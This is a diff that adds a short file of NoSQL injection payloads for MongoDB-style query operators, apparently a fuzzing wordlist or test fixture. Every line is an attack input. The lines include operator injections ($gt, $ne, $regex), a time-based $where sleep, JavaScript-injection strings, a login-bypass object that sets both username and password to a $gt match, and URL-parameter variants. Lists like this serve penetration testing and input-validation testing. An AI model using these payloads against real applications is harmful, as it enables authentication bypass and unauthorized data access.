@@ -1,0 +1,10 @@
+{"$gt": ""}
+{"$ne": null}
+{"$where": "sleep(5000)"}
+{"$regex": ".*"}
+' || '1'=='1
+';return true;//
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+[$ne]=1
+[$gt]=0
+[$regex]=.*
